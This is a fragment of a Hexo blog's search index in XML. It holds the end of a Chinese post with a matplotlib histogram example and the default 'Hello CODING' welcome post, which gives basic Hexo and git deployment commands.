punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604764dc3b957.jpg" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#随机生成满足mu为100、sigma为20的正态分布数据，并绘制其直方图</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np mu<span class="token punctuation">,</span>sigma<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">20</span>x<span class="token operator">=</span>mu<span class="token operator">+</span>sigma<span class="token operator">*</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span>density<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>facecolor<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>alpha<span class="token operator">=</span><span class="token number">0.75</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#绘制直方图</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'IQ'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#绘制坐标等信息</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Probability'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Histogram of IQ'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.03</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#设置坐标和网格</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604764dc6e394.jpg" alt=""><br>                                      ​<br>3/9/2021 8:23:59 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>你好 CODING</title>
      <link href="2021/03/04/hello-world/"/>
      <url>2021/03/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>欢迎使用 <a href="https://help.coding.net/docs/cd/static-website-v2.html" target="_blank" rel="noopener">CODING DevOps 静态网站</a> 部署 <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 应用！<br>您可以到这里查看更多的 Hexo 的 <a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">文档</a>。</p><p>这是你的第一篇文章。</p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><h3 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>相关帮助: <a href="https://hexo.io/zh-cn/docs/writing.html" target="_blank" rel="noopener">写作</a></p><h3 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>相关帮助: <a href="https://hexo.io/zh-cn/docs/server.html" target="_blank" rel="noopener">服务器</a></p><h3 id="部署到线上"><a href="#部署到线上" class="headerlink" title="部署到线上"></a>部署到线上</h3><pre class=" language-bash"><code class="language-bash">$ <span class="token function">git</span> add <span class="token keyword">.</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> commit -m <span class="token string">'new post'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> push</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
